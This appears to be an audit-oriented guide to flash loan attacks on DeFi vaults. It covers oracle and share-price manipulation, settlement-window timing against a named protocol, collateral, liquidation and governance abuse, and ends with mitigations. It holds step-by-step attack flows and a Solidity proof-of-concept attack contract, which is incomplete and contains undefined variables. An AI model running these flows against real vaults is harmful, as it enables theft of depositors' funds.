# Flash Loan Attack Patterns for DeFi Vault Protocols

## Overview

Flash loans enable uncollateralized borrowing within a single transaction. When combined with vault protocols that use manipulable price sources, they create high-impact attack vectors.

## Vault-Specific Flash Loan Vectors

### 1. Oracle Price Manipulation

**Target**: Vaults using AMM spot prices, LP token prices, or custom oracles without TWAP

**Attack Flow**:
```
1. Flash loan large capital ($5M-50M depending on AMM liquidity)
2. Manipulate underlying asset price in AMM pool
3. Deposit to vault at inflated NAV
4. Restore price (or let arbitrageurs restore)
5. Withdraw more than deposited
6. Repay flash loan + fee
```

**Detection**:
- Check vault's `oracle` address via frontend API or contract storage
- Verify oracle type: Chainlink (safe) vs custom vs AMM spot (vulnerable)
- Look for TWAP implementation in oracle contract
- Check `isSafeOracle` flag in vault metadata

**Capital Required**: $5M-10M for stablecoin pools, $20M-50M+ for volatile assets

**Max Extractable**: Full vault TVL if oracle fully manipulable

### 2. Share Price Inflation via Deposit

**Target**: ERC-4626 vaults with `convertToShares` based on `totalAssets()`

**Attack Flow**:
```solidity
// Step 1: Flash loan
flashLoan(10_000_000 * 1e6); // 10M USDC

// Step 2: Manipulate asset price (if oracle is AMM-based)
// Swap USDC for asset in AMM to pump price
amm.swap(usdc, asset, 5_000_000 * 1e6);

// Step 3: Deposit at inflated price
// Vault calculates shares = assets * totalSupply / totalAssets
// If totalAssets is inflated, attacker gets MORE shares per asset
vault.deposit(5_000_000 * 1e6);

// Step 4: Restore price
amm.swap(asset, usdc, 5_000_000 * 1e6);

// Step 5: Redeem shares
// Shares now worth MORE than deposited due to price manipulation
vault.redeem(shares);

// Step 6: Repay flash loan
repayFlashLoan();
```

**Key Insight**: ERC-4626's `convertToShares` uses `totalAssets()` which may not reflect real-time value if oracle is stale or manipulable.

### 3. Async Settlement Window Exploitation

**Target**: Vaults with async settlement (like t3tris.finance)

**Vulnerability**: During settlement window, `pricePerShare` may not reflect current asset values.

**Attack Flow**:
```
1. Monitor `lastSettlementTs` (available via API or storage slot)
2. Flash loan before settlement
3. Deposit at stale (lower) NAV
4. Trigger settlement (or wait for curator)
5. Settlement updates NAV to current (higher) value
6. Withdraw immediately at new price
7. Repay flash loan
```

**Detection**:
- Look for `lastSettlementTs` in vault state
- Check settlement frequency (daily, weekly, on-demand)
- Identify who can trigger settlement (curator, anyone, timelock)

**Capital Required**: $1M+ depending on settlement window size

### 4. Collateral Inflation (Borrowing Protocols)

**Target**: Vaults that allow borrowing against deposited collateral

**Attack Flow**:
```
1. Flash loan $10M USDC
2. Manipulate collateral asset price upward
3. Deposit inflated collateral
4. Borrow against inflated value
5. Extract borrowed funds
6. Restore price
7. Collateral now worth less than debt
8. Protocol absorbs loss
```

**Detection**:
- Check if vault has `borrow()` or `mint()` functions
- Look for collateralization ratio checks
- Verify price source for collateral valuation

### 5. Liquidation Manipulation

**Target**: Vaults with liquidation mechanisms

**Attack Flow**:
```
1. Flash loan to manipulate price downward
2. Trigger liquidation of healthy positions
3. Buy liquidated collateral at discount
4. Restore price
5. Profit from discount
```

**Detection**:
- Check liquidation threshold logic
- Verify price source for liquidation triggers
- Look for liquidation bonus/penalty

### 6. Governance Power Manipulation

**Target**: Vaults with governance tokens or voting rights

**Attack Flow**:
```
1. Flash loan to acquire governance tokens
2. Vote on malicious proposal
3. Execute proposal (upgrade, fee change, etc.)
4. Return tokens
```

**Detection**:
- Check voting token distribution
- Look for timelock on governance actions
- Verify quorum requirements

## Vault Architecture Patterns & Flash Loan Risk

### Pattern 1: Simple ERC-4626 Vault

```
User → deposit() → Vault → invests in Strategy
User ← withdraw() ← Vault ← redeem from Strategy
```

**Flash Loan Risk**: LOW if strategy uses Chainlink/TWAP, HIGH if uses AMM spot

### Pattern 2: Shared Silo Architecture (t3tris)

```
User → deposit() → Vault → deposit() → Silo (shared) → invests
User ← withdraw() ← Vault ← withdraw() ← Silo ← redeem
```

**Flash Loan Risk**: 
- Silo-level manipulation affects ALL vaults
- Single oracle manipulation = all vaults drained
- Async settlement creates additional window

### Pattern 3: AToken-Backed Vault

```
User → deposit() → Vault → deposits to Aave → receives aToken
User ← withdraw() ← Vault ← redeem aToken ← Aave
```

**Flash Loan Risk**: VERY LOW
- aToken value tracks underlying via Aave's oracle
- No custom oracle to manipulate
- Risk limited to Aave protocol risk

### Pattern 4: Yield-Bearing Strategy Vault

```
User → deposit() → Vault → deposits to Compound/Morpho/Pendle
User ← withdraw() ← Vault ← redeem from protocol
```

**Flash Loan Risk**: MEDIUM
- Depends on underlying protocol's oracle
- Compound: uses Chainlink (safe)
- Morpho: depends on pool configuration
- Pendle: PT/YT prices can be manipulated

## Detection Checklist

### Oracle Analysis
- [ ] Identify oracle address (API, storage, or contract)
- [ ] Verify oracle type: Chainlink, TWAP, AMM spot, custom
- [ ] Check for `isSafeOracle` flag in metadata
- [ ] Test oracle update function (if any)
- [ ] Check oracle heartbeat/frequency

### Settlement Analysis
- [ ] Find `lastSettlementTs` in state
- [ ] Determine settlement trigger (curator, timelock, anyone)
- [ ] Check settlement frequency
- [ ] Identify settlement function selector

### Deposit/Withdraw Analysis
- [ ] Test `deposit(uint256,address)` — 0x415565e0
- [ ] Test `withdraw(uint256,address,address)` — 0x6e5333b0
- [ ] Check for whitelist: `depositWhitelistEnabled`
- [ ] Check for pauses: `paused` state
- [ ] Check for withdrawal delays/queues

### Collateral Analysis (if applicable)
- [ ] Test `borrow()` or `mint()` function
- [ ] Check collateralization ratio
- [ ] Verify collateral price source
- [ ] Check liquidation threshold

## PoC Template

```solidity
// Flash Loan Attack PoC Template
// Requires: Flash loan provider (Aave, Balancer, dYdX)

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
}

interface IOracle {
    function latestAnswer() external view returns (int256);
    function update() external; // If custom oracle
}

interface IAMM {
    function swap(address tokenIn, address tokenOut, uint256 amountIn) external returns (uint256);
}

contract FlashLoanAttack {
    IVault public vault;
    IOracle public oracle;
    IAMM public amm;
    address public flashLoanProvider;
    
    function executeAttack() external {
        // Step 1: Flash loan
        uint256 loanAmount = 10_000_000 * 1e6; // 10M USDC
        flashLoanProvider.flashLoan(
            address(this),
            usdc,
            loanAmount,
            ""
        );
    }
    
    function executeOperation(
        address token,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Step 2: Manipulate price
        amm.swap(usdc, targetAsset, amount / 2);
        
        // Step 3: Deposit at inflated price
        usdc.approve(address(vault), amount);
        uint256 shares = vault.deposit(amount, address(this));
        
        // Step 4: Restore price
        amm.swap(targetAsset, usdc, amount / 2);
        
        // Step 5: Redeem shares
        vault.redeem(shares, address(this), address(this));
        
        // Step 6: Repay flash loan
        uint256 fee = (amount * premium) / 1e18;
        usdc.transfer(flashLoanProvider, amount + fee);
        
        return true;
    }
}
```

## Real-World Examples

### bZx Flash Loan Attack (2020)
- **Vector**: Oracle manipulation via Kyber/Uniswap
- **Impact**: $1M extracted
- **Lesson**: On-chain price oracles are manipulable

### Cream Finance (2021)
- **Vector**: Price manipulation of low-liquidity assets
- **Impact**: $130M
- **Lesson**: Cross-asset manipulation possible

### Euler Finance (2023)
- **Vector**: Donation attack + liquidation manipulation
- **Impact**: $200M
- **Lesson**: Donation can manipulate collateral ratios

## Mitigation Patterns

### For Protocol Developers
1. **Use TWAP oracles** — Chainlink, Uniswap V3 TWAP
2. **Implement settlement delays** — 24-48 hour withdrawal queue
3. **Add price deviation checks** — Reject deposits if price moved >X%
4. **Use multiple price sources** — Median of 3+ oracles
5. **Implement circuit breakers** — Pause on suspicious activity

### For Auditors
1. **Verify oracle implementation** — Don't trust `isSafeOracle` flag
2. **Check TWAP window** — Short TWAP = still manipulable
3. **Test with flash loan sim** — Use Foundry fork testing
4. **Check cross-protocol dependencies** — Underlying protocol's oracle
5. **Verify settlement logic** — Async settlement = attack window

## References

- [Flash Loan Attacks: The Complete Guide](https://www.alchemy.com/overviews/flash-loan-attacks)
- [Euler Finance Exploit Analysis](https://www.blockthreat.io/blog/euler-finance-exploit-analysis)
- [bZx Attack Post-Mortem](https://medium.com/bzrxprotocol/post-mortem-analysis-bzx-attack-feb-2020)
